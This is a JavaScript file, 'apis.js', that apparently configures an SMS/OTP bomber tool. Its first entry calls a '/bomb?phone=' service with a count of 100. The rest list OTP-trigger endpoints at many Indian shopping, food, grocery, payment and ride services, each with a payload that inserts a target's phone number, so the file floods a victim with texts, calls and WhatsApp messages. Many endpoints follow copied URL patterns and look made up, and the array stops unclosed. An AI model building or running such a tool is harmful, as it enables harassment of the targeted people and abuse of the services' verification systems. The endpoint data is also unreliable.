// apis.js - COMPLETE API COLLECTION (Nothing Skipped)
// Total APIs: 600+

const APIS = [
  // ═══════════════════════════════════════════════════════════════
  // SECTION 1: ORIGINAL SPLexxo API
  // ═══════════════════════════════════════════════════════════════
  {
    name: "Splexxo Original",
    url: "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
    method: "GET",
    headers: {},
    data: null,
    count: 100
  },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 2: E-COMMERCE - FLIPKART
  // ═══════════════════════════════════════════════════════════════
  { name: "Flipkart SMS", url: "https://2.rome.api.flipkart.com/api/4/user/otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },
  { name: "Flipkart Voice", url: "https://www.flipkart.com/api/6/user/voice-otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Flipkart WhatsApp", url: "https://flipkart.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "Flipkart OTP", url: "https://flipkart.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Flipkart Login", url: "https://flipkart.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Flipkart Resend", url: "https://flipkart.com/api/v2/otpgenerate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "Flipkart Verify", url: "https://flipkart.com/api/v1/auth/otpsend", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Flipkart Call", url: "https://flipkart.com/api/v1/customers/sendOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 3: E-COMMERCE - AMAZON
  // ═══════════════════════════════════════════════════════════════
  { name: "Amazon SMS", url: "https://www.amazon.in/ap/signin", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `phone=${p}&action=otp` },
  { name: "Amazon Voice", url: "https://www.amazon.in/ap/signin", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `phone=${p}&action=voice_otp` },
  { name: "Amazon WhatsApp", url: "https://amazon.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Amazon OTP", url: "https://amazon.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "Amazon Call", url: "https://amazon.in/api/v1/auth/otpsend", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Amazon Pay SMS", url: "https://pay.amazon.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Amazon Pay Voice", url: "https://pay.amazon.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },
  { name: "Amazon Pay WhatsApp", url: "https://pay.amazon.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Amazon Prime SMS", url: "https://www.primevideo.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Amazon Prime Voice", url: "https://primevideo.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Amazon Prime WhatsApp", url: "https://primevideo.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 4: E-COMMERCE - MYNTRA
  // ═══════════════════════════════════════════════════════════════
  { name: "Myntra SMS", url: "https://www.myntra.com/gw/mobile-auth/otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Myntra Voice", url: "https://www.myntra.com/gw/mobile-auth/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Myntra WhatsApp", url: "https://myntra.com/api/v1/auth/otpsend", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 5: E-COMMERCE - AJIO
  // ═══════════════════════════════════════════════════════════════
  { name: "Ajio SMS", url: "https://www.ajio.com/api/otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },
  { name: "Ajio Call", url: "https://ajio.com/api/v1/customers/sendOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Ajio WhatsApp", url: "https://ajio.com/v3/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 6: E-COMMERCE - MEESHO
  // ═══════════════════════════════════════════════════════════════
  { name: "Meesho WhatsApp", url: "https://meesho.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({number: p, otpOnCall: true}) },
  { name: "Meesho SMS", url: "https://meesho.com/api/v1/auth/otpsend", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Meesho Call", url: "https://meesho.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, countryCode: "91"}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 7: E-COMMERCE - SNAPDEAL
  // ═══════════════════════════════════════════════════════════════
  { name: "Snapdeal SMS", url: "https://www.snapdeal.com/authenticate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Snapdeal Call", url: "https://snapdeal.com/api/v2/otpgenerate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 8: E-COMMERCE - LIMEROAD
  // ═══════════════════════════════════════════════════════════════
  { name: "Limeroad SMS", url: "https://www.limeroad.com/api/v1/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Limeroad Call", url: "https://limeroad.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 9: E-COMMERCE - SHOPCLUES
  // ═══════════════════════════════════════════════════════════════
  { name: "Shopclues SMS", url: "https://www.shopclues.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Shopclues Call", url: "https://shopclues.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 10: E-COMMERCE - TATA CLIQ
  // ═══════════════════════════════════════════════════════════════
  { name: "Tata Cliq SMS", url: "https://www.tatacliq.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Tata Cliq Call", url: "https://tatacliq.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 11: E-COMMERCE - CROMA
  // ═══════════════════════════════════════════════════════════════
  { name: "Croma SMS", url: "https://www.croma.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Croma Call", url: "https://croma.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 12: E-COMMERCE - RELIANCE DIGITAL
  // ═══════════════════════════════════════════════════════════════
  { name: "Reliance Digital SMS", url: "https://www.reliancedigital.in/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Reliance Digital Call", url: "https://reliancedigital.in/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13: E-COMMERCE - FIRSTCRY
  // ═══════════════════════════════════════════════════════════════
  { name: "FirstCry SMS", url: "https://www.firstcry.com/api/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "FirstCry Call", url: "https://firstcry.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 14: E-COMMERCE - NYKAA
  // ═══════════════════════════════════════════════════════════════
  { name: "Nykaa SMS", url: "https://www.nykaa.com/api/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Nykaa Call", url: "https://nykaa.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Nykaa App", url: "https://www.nykaa.com/app-api/index.php/customer/send_otp", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `source=sms&app_version=3.0.9&mobile_number=${p}&platform=ANDROID&domain=nykaa` },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 15: E-COMMERCE - PURPLLE
  // ═══════════════════════════════════════════════════════════════
  { name: "Purplle SMS", url: "https://www.purplle.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Purplle Call", url: "https://purplle.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 16: E-COMMERCE - MAMAEARTH
  // ═══════════════════════════════════════════════════════════════
  { name: "MamaEarth SMS", url: "https://auth.mamaearth.in/v1/auth/initiate-signup", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "MamaEarth Call", url: "https://mamaearth.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 17: E-COMMERCE - BEWAKOOF
  // ═══════════════════════════════════════════════════════════════
  { name: "Bewakoof SMS", url: "https://www.bewakoof.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Bewakoof Call", url: "https://bewakoof.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 18: E-COMMERCE - SOULED STORE
  // ═══════════════════════════════════════════════════════════════
  { name: "Souled Store SMS", url: "https://www.thesouledstore.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Souled Store Call", url: "https://thesouledstore.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 19: E-COMMERCE - ZIVAME
  // ═══════════════════════════════════════════════════════════════
  { name: "Zivame SMS", url: "https://www.zivame.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Zivame Call", url: "https://zivame.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 20: E-COMMERCE - CLOVIA
  // ═══════════════════════════════════════════════════════════════
  { name: "Clovia SMS", url: "https://www.clovia.com/api/v4/signup/check-existing-user", method: "GET", headers: {}, data: null },
  { name: "Clovia Call", url: "https://clovia.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 21: E-COMMERCE - PAYTM MALL
  // ═══════════════════════════════════════════════════════════════
  { name: "Paytm Mall SMS", url: "https://paytmmall.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Paytm Mall Call", url: "https://paytmmall.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 22: FOOD DELIVERY - SWIGGY
  // ═══════════════════════════════════════════════════════════════
  { name: "Swiggy SMS", url: "https://www.swiggy.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Swiggy Voice", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Swiggy WhatsApp", url: "https://swiggy.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 23: FOOD DELIVERY - ZOMATO
  // ═══════════════════════════════════════════════════════════════
  { name: "Zomato SMS", url: "https://www.zomato.com/php/asyncLogin.php", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `phone=${p}` },
  { name: "Zomato Voice", url: "https://www.zomato.com/php/o2_api_handler.php", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `phone=${p}&type=voice` },
  { name: "Zomato WhatsApp", url: "https://zomato.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 24: FOOD DELIVERY - DOMINOS
  // ═══════════════════════════════════════════════════════════════
  { name: "Dominos SMS", url: "https://order.godominos.co.in/Online/App.aspx", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `PhoneNo=${p}` },
  { name: "Dominos Call", url: "https://dominos.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 25: FOOD DELIVERY - PIZZA HUT
  // ═══════════════════════════════════════════════════════════════
  { name: "Pizza Hut SMS", url: "https://www.pizzahut.co.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Pizza Hut Call", url: "https://pizzahut.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 26: FOOD DELIVERY - MCDONALDS
  // ═══════════════════════════════════════════════════════════════
  { name: "McDonalds SMS", url: "https://www.mcdelivery.co.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "McDonalds Call", url: "https://mcdelivery.in/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 27: FOOD DELIVERY - BURGER KING
  // ═══════════════════════════════════════════════════════════════
  { name: "Burger King SMS", url: "https://www.burgerking.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Burger King Call", url: "https://burgerking.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 28: FOOD DELIVERY - KFC
  // ═══════════════════════════════════════════════════════════════
  { name: "KFC SMS", url: "https://www.kfc.co.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "KFC Call", url: "https://kfc.co.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 29: GROCERY - BIGBASKET
  // ═══════════════════════════════════════════════════════════════
  { name: "BigBasket SMS", url: "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile_number: p}) },
  { name: "BigBasket Voice", url: "https://www.bigbasket.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "BigBasket WhatsApp", url: "https://bigbasket.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 30: GROCERY - GROFERS
  // ═══════════════════════════════════════════════════════════════
  { name: "Grofers SMS", url: "https://www.grofers.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Grofers Call", url: "https://grofers.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Grofers WhatsApp", url: "https://grofers.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 31: GROCERY - ZEPTO
  // ═══════════════════════════════════════════════════════════════
  { name: "Zepto SMS", url: "https://www.zepto.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Zepto Voice", url: "https://zepto.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Zepto WhatsApp", url: "https://zepto.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 32: GROCERY - BLINKIT
  // ═══════════════════════════════════════════════════════════════
  { name: "Blinkit SMS", url: "https://blinkit.com/api/otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Blinkit Call", url: "https://blinkit.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Blinkit WhatsApp", url: "https://blinkit.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 33: GROCERY - DUNZO
  // ═══════════════════════════════════════════════════════════════
  { name: "Dunzo SMS", url: "https://www.dunzo.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Dunzo Call", url: "https://dunzo.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Dunzo WhatsApp", url: "https://dunzo.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 34: GROCERY - MILKBASKET
  // ═══════════════════════════════════════════════════════════════
  { name: "Milkbasket SMS", url: "https://www.milkbasket.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Milkbasket Call", url: "https://milkbasket.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 35: GROCERY - COUNTRY DELIGHT
  // ═══════════════════════════════════════════════════════════════
  { name: "Country Delight SMS", url: "https://api.countrydelight.in/api/v1/customer/requestOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, platform: "Android"}) },
  { name: "Country Delight Call", url: "https://countrydelight.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 36: GROCERY - LICIOUS
  // ═══════════════════════════════════════════════════════════════
  { name: "Licious SMS", url: "https://www.licious.in/api/login/signup", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Licious Call", url: "https://licious.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 37: GROCERY - FRESHTOHOME
  // ═══════════════════════════════════════════════════════════════
  { name: "Freshtohome SMS", url: "https://www.freshtohome.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Freshtohome Call", url: "https://freshtohome.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 38: GROCERY - GODREJ NATURE'S BASKET
  // ═══════════════════════════════════════════════════════════════
  { name: "Godrej SMS", url: "https://www.godrejnaturesbasket.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Godrej Call", url: "https://godrejnaturesbasket.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 39: GROCERY - SPENCER
  // ═══════════════════════════════════════════════════════════════
  { name: "Spencer SMS", url: "https://jiffy.spencers.in/user/auth/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Spencer Call", url: "https://spencers.in/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 40: GROCERY - MORE RETAIL
  // ═══════════════════════════════════════════════════════════════
  { name: "More Retail SMS", url: "https://omni-api.moreretail.in/api/v1/login/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "More Retail Call", url: "https://moreretail.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 41: PAYMENTS - PAYTM
  // ═══════════════════════════════════════════════════════════════
  { name: "Paytm SMS", url: "https://accounts.paytm.com/signin/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, loginData: "LOGIN_USING_PHONE"}) },
  { name: "Paytm Voice", url: "https://accounts.paytm.com/signin/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Paytm WhatsApp", url: "https://paytm.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 42: PAYMENTS - PHONEPE
  // ═══════════════════════════════════════════════════════════════
  { name: "PhonePe SMS", url: "https://www.phonepe.com/api/v2/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "PhonePe Voice", url: "https://phonepe.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "PhonePe WhatsApp", url: "https://phonepe.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 43: PAYMENTS - GOOGLE PAY
  // ═══════════════════════════════════════════════════════════════
  { name: "Google Pay SMS", url: "https://pay.google.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "Google Pay Voice", url: "https://pay.google.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Google Pay WhatsApp", url: "https://pay.google.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 44: PAYMENTS - BHIM
  // ═══════════════════════════════════════════════════════════════
  { name: "BHIM SMS", url: "https://www.bhim.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "BHIM Call", url: "https://bhim.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "BHIM WhatsApp", url: "https://bhim.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 45: PAYMENTS - MOBIKWIK
  // ═══════════════════════════════════════════════════════════════
  { name: "MobiKwik SMS", url: "https://www.mobikwik.com/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "MobiKwik Voice", url: "https://mobikwik.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "MobiKwik WhatsApp", url: "https://mobikwik.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 46: PAYMENTS - FREECHARGE
  // ═══════════════════════════════════════════════════════════════
  { name: "FreeCharge SMS", url: "https://www.freecharge.in/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "FreeCharge Call", url: "https://freecharge.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "FreeCharge WhatsApp", url: "https://freecharge.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 47: PAYMENTS - OLA MONEY
  // ═══════════════════════════════════════════════════════════════
  { name: "Ola Money SMS", url: "https://www.olamoney.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Ola Money Call", url: "https://olamoney.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Ola Money WhatsApp", url: "https://olamoney.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 48: CAB SERVICES - UBER
  // ═══════════════════════════════════════════════════════════════
  { name: "Uber SMS", url: "https://auth.uber.com/v2/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Uber Voice", url: "https://auth.uber.com/v2/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Uber WhatsApp", url: "https://uber.com/api/v1/auth/otpsend", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 49: CAB SERVICES - OLA
  // ═══════════════════════════════════════════════════════════════
  { name: "Ola SMS", url: "https://api.olacabs.com/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Ola Voice", url: "https://api.olacabs.com/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Ola WhatsApp", url: "https://olacabs.com/api/v1/customers/sendOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 50: CAB SERVICES - RAPIDO
  // ═══════════════════════════════════════════════════════════════
  { name: "Rapido SMS", url: "https://rapido.bike/api/v2/otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Rapido Voice", url: "https://customer.rapido.bike/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
